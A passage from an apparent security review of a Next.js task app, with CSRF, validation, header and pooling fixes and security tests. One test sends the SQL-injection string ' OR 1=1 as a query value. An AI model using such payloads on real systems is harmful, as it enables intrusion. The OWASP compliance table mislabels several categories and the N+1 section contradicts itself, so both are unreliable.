- **Unauthorized Actions:** Attackers modify tasks without user knowledge
- **Data Integrity:** Tasks deleted or marked as done unintentionally
- **Account Compromise:** User actions attributed to attacker

**Recommended Fix:**

Use a CSRF token strategy. Install package:
```bash
npm install csrf
```

Create CSRF middleware:
```typescript
// src/lib/csrf.ts
import csrf from "csrf";
import { cookies } from "next/headers";

const csrfProtection = new csrf();

export async function generateCsrfToken(): Promise<string> {
  const cookieStore = await cookies();
  let secret = cookieStore.get("csrf_secret")?.value;
  
  if (!secret) {
    secret = csrfProtection.secretSync();
    cookieStore.set("csrf_secret", secret, {
      httpOnly: true,
      secure: process.env.NODE_ENV === "production",
      sameSite: "strict",
      maxAge: 3600,
    });
  }

  const token = csrfProtection.create(secret);
  return token;
}

export async function verifyCsrfToken(token: string): Promise<boolean> {
  const cookieStore = await cookies();
  const secret = cookieStore.get("csrf_secret")?.value;
  
  if (!secret) return false;
  return csrfProtection.verify(secret, token);
}
```

Expose CSRF token to client:
```typescript
// src/app/api/csrf/route.ts
import { NextResponse } from "next/server";
import { generateCsrfToken } from "@/lib/csrf";

export async function GET() {
  const token = await generateCsrfToken();
  return NextResponse.json({ token });
}
```

Validate CSRF token on mutations:
```typescript
// src/app/api/projects/[id]/tasks/route.ts
import { verifyCsrfToken } from "@/lib/csrf";

export async function POST(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();

  // ✅ Validate CSRF token
  const csrfToken = req.headers.get("x-csrf-token");
  if (!csrfToken || !(await verifyCsrfToken(csrfToken))) {
    return forbidden("invalid CSRF token");
  }

  // ... rest of POST logic
}
```

Fetch CSRF token and include in requests:
```typescript
// src/lib/api-client.ts
let csrfToken: string | null = null;

export async function getCsrfToken(): Promise<string> {
  if (csrfToken) return csrfToken;
  
  const res = await fetch("/api/csrf");
  const data = await res.json();
  csrfToken = data.token;
  return csrfToken;
}

export async function apiFetch<T>(path: string, options: RequestInit = {}): Promise<T> {
  const token = getAccessToken();
  const headers = new Headers(options.headers);
  headers.set("Content-Type", "application/json");
  
  if (token) headers.set("Authorization", `Bearer ${token}`);
  
  // Include CSRF token for mutations
  if (["POST", "PATCH", "DELETE", "PUT"].includes(options.method || "GET")) {
    const csrf = await getCsrfToken();
    headers.set("X-CSRF-Token", csrf);
  }

  const res = await fetch(path, { ...options, headers });
  // ... rest of apiFetch
}
```

**Alternative (SameSite cookies only):**
If using only SameSite=Strict cookies, CSRF risk is largely mitigated:
```typescript
// Set all cookies with SameSite=Strict
const response = NextResponse.json({ user, token });
response.cookies.set({
  name: "jwt",
  value: token,
  httpOnly: true,
  secure: process.env.NODE_ENV === "production",
  sameSite: "strict",
  maxAge: 30 * 24 * 60 * 60,
});
return response;
```

**Priority:** Deploy before production — medium-complexity fix with good security benefit.

---

#### 10. Missing Input Validation on Sensitive Fields
**Severity:** MEDIUM  
**Affected Files:** All schema validation files  
**Affected Endpoints:** All mutation endpoints

**Technical Explanation:**
While Zod schemas exist, some validation gaps remain:

1. **Email Normalization:** Emails not normalized (test@EXAMPLE.com vs test@example.com = duplicate users)
2. **Password Strength:** Minimum 8 chars but no complexity requirements
3. **URL Encoding:** Task descriptions can contain XSS vectors
4. **Task Position:** Integer overflow on position field

**Recommended Fix:**

```typescript
// src/schemas/auth.ts
import { z } from "zod";

const normalizeEmail = (email: string) => email.toLowerCase().trim();

const passwordSchema = z
  .string()
  .min(8, "password must be at least 8 characters")
  .regex(/[A-Z]/, "password must contain uppercase letter")
  .regex(/[a-z]/, "password must contain lowercase letter")
  .regex(/[0-9]/, "password must contain number")
  .regex(/[!@#$%^&*]/, "password must contain special character");

export const registerSchema = z.object({
  email: z.string().email().transform(normalizeEmail),
  password: passwordSchema,
  name: z.string().min(1).max(80).trim(),
});

export const loginSchema = z.object({
  email: z.string().email().transform(normalizeEmail),
  password: z.string().min(1),
});
```

```typescript
// src/schemas/task.ts
import { z } from "zod";

export const createTaskSchema = z.object({
  title: z.string().min(1).max(200).trim(),
  description: z.string().max(5000).trim().optional(),
  status: taskStatusSchema.optional(),
  assigneeId: z.string().uuid().nullable().optional(),  // ✅ UUID validation
  position: z.number().int().min(0).max(2147483647).optional(),  // ✅ Prevent overflow
});
```

**Priority:** Low — foundational validation exists; these are hardening measures.

---

## N+1 Query Analysis

**Severity:** LOW-MEDIUM  
**Affected Files:** [src/app/api/projects/[id]/route.ts:25-40](src/app/api/projects/[id]/route.ts#L25-L40)

**Finding:**
The `/api/projects/[id]` endpoint eagerly loads all related data without pagination:

```typescript
const project = await prisma.project.findUnique({
  where: { id },
  include: {
    owner: true,
    memberships: {
      include: { user: true },  // Loads all members + their details
    },
    tasks: {
      include: {
        assignee: true,         // Loads all tasks + assignees
        createdBy: true,        // Loads task creator
      },
      orderBy: [{ status: "asc" }, { position: "asc" }],
    },
  },
});
```

For a project with 1000 tasks:
- 1 query for project
- 1 query for owner
- 1 query for memberships
- N queries for each membership's user (if no optimization)
- 1 query for tasks
- N queries for assignees (if no optimization)
- N queries for creators (if no optimization)

**Recommended Fix:**
```typescript
// Already optimized by Prisma with includes — N+1 is prevented
// But add pagination for large projects:
const tasks = await prisma.task.findMany({
  where: { projectId: id },
  include: {
    assignee: { select: { id: true, name: true, email: true } },
    createdBy: { select: { id: true, name: true, email: true } },
  },
  orderBy: [{ status: "asc" }, { position: "asc" }],
  take: 200,  // ✅ Paginate large task lists
  skip: 0,
});
```

**Priority:** Low — Prisma optimizes this, but consider pagination for scale.

---

## Missing Security Headers

**Severity:** MEDIUM  
**Affected Files:** [next.config.ts](next.config.ts)

**Finding:**
Application doesn't set important security headers:
- `Content-Security-Policy` — prevents XSS
- `X-Frame-Options` — prevents clickjacking
- `X-Content-Type-Options` — prevents MIME sniffing
- `Strict-Transport-Security` — enforces HTTPS

**Recommended Fix:**
```typescript
// next.config.ts
import type { NextConfig } from "next";

const nextConfig: NextConfig = {
  reactStrictMode: true,
  experimental: {
    typedRoutes: false,
  },
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          {
            key: "X-Content-Type-Options",
            value: "nosniff",
          },
          {
            key: "X-Frame-Options",
            value: "DENY",
          },
          {
            key: "X-XSS-Protection",
            value: "1; mode=block",
          },
          {
            key: "Referrer-Policy",
            value: "strict-origin-when-cross-origin",
          },
          {
            key: "Permissions-Policy",
            value: "camera=(), microphone=(), geolocation=()",
          },
        ],
      },
      {
        source: "/:path*",
        headers: [
          {
            key: "Strict-Transport-Security",
            value: "max-age=31536000; includeSubDomains",
          },
        ],
        has: [{ type: "header", key: "x-forwarded-proto", value: "https" }],
      },
      {
        source: "/api/:path*",
        headers: [
          {
            key: "Content-Security-Policy",
            value: "default-src 'self'",
          },
        ],
      },
    ];
  },
};

export default nextConfig;
```

**Priority:** Medium — improves defense-in-depth.

---

## Production Scalability & Reliability Issues

#### Missing Database Connection Pooling
**Severity:** MEDIUM (Production Scalability)  
**Affected Files:** [src/lib/prisma.ts](src/lib/prisma.ts)

**Finding:**
Prisma client is created once, but for serverless (Lambda), connection limits may be exceeded:

```typescript
export const prisma = globalForPrisma.prisma ?? new PrismaClient();
```

For 100 concurrent Lambda instances, this creates 100 database connections.

**Recommended Fix:**
```typescript
import { PrismaClient } from "@prisma/client";

const globalForPrisma = globalThis as unknown as { prisma?: PrismaClient };

export const prisma =
  globalForPrisma.prisma ??
  new PrismaClient({
    log: process.env.NODE_ENV === "development" ? ["query", "error", "warn"] : ["error"],
  });

if (process.env.NODE_ENV !== "production") {
  globalForPrisma.prisma = prisma;
}

// Handle graceful shutdown
if (typeof global !== "undefined") {
  process.on("SIGTERM", async () => {
    await prisma.$disconnect();
  });
}
```

Use PgBouncer or Neon's built-in connection pooling for PostgreSQL.

**Priority:** Deploy with production setup.

---

## Summary of Fixes by Timeline

### 🚨 Immediate (Before Deploying)
1. Rotate and secure credentials in `.env`
2. Fix SQL injection in task search (use Prisma parameterized queries)
3. Add authorization checks to PATCH/DELETE task endpoints

### ⚡ This Release
1. Add assignee validation to task creation
2. Implement rate limiting
3. Add CSRF protection
4. Implement audit logging

### 📋 Next Release
1. Implement refresh token strategy (shorter JWT expiration)
2. Add database constraints and indexes
3. Add security headers
4. Add comprehensive error handling

### 🔄 Ongoing
1. Set up automated security scanning (SonarQube, OWASP Dependency Check)
2. Implement WAF rules
3. Set up database monitoring and alerting
4. Conduct regular penetration testing

---

## Compliance Gaps

**OWASP Top 10 Coverage:**
- ✅ A01:2021 – Broken Access Control — Partially addressed but has gaps (Issue #2)
- ✅ A02:2021 – Cryptographic Failures — OK (using bcrypt, JWT)
- 🚨 A03:2021 – Injection — SQL Injection found (Issue #1)
- 🚨 A04:2021 – Insecure Design — No rate limiting (Issue #6)
- ✅ A05:2021 – Security Misconfiguration — Credentials exposed (Issue #3)
- 🚨 A06:2021 – Vulnerable & Outdated Components — No audit logging (Issue #7)
- ✅ A07:2021 – Authentication Failures — Weak JWT config (Issue #5)
- 🚨 A08:2021 – CSRF — No protection (Issue #9)
- ✅ A09:2021 – Using Logging & Monitoring — Missing (Issue #7)
- ✅ A10:2021 – SSRF — N/A

**SOC2 Type II Requirements:**
- ❌ Audit Logging — Not implemented (Issue #7)
- ❌ Change Management — No deployment automation visible
- ❌ Access Controls — Gaps in authorization (Issue #2)
- ❌ Encryption in Transit — TLS not configured in code

---

## Testing Recommendations

Create integration tests for security fixes:
```typescript
// src/tests/security.test.ts
import { describe, it, expect, beforeEach } from "vitest";

describe("Security", () => {
  describe("SQL Injection", () => {
    it("should escape search parameters", async () => {
      const response = await fetch("/api/projects/proj-123/tasks?q=%27 OR 1=1");
      expect(response.status).toBe(200);
      // Should not return all tasks, only matching
    });
  });

  describe("Authorization", () => {
    it("should reject task updates from non-members", async () => {
      const response = await fetch("/api/tasks/task-id", {
        method: "PATCH",
        headers: { Authorization: `Bearer ${attacker_token}` },
        body: JSON.stringify({ status: "done" }),
      });
      expect(response.status).toBe(403);
    });
  });

  describe("Rate Limiting", () => {
    it("should rate limit login attempts", async () => {
      for (let i = 0; i < 6; i++) {
        const response = await fetch("/api/auth/login", {
          method: "POST",
          body: JSON.stringify({ email: "user@test.com", password: "wrong" }),
        });
        if (i < 5) {
          expect(response.status).toBe(401);
        } else {
          expect(response.status).toBe(429);
        }
      }
    });
  });
});
```

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
- [Prisma Security Best Practices](https://www.prisma.io/docs/concepts/components/prisma-client/raw-database-access#raw-sql)
- [Next.js Security](https://nextjs.org/docs/advanced-features/security)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)

---

## Sign-Off

This review is intended for internal engineering team use and should inform security posture decisions. All CRITICAL issues require resolution before production deployment. HIGH issues should be addressed in the current development cycle.

**Reviewer:** Senior Security & Engineering Review  
**Date:** 2026-05-22  
**Status:** Ready for team discussion and remediation planning
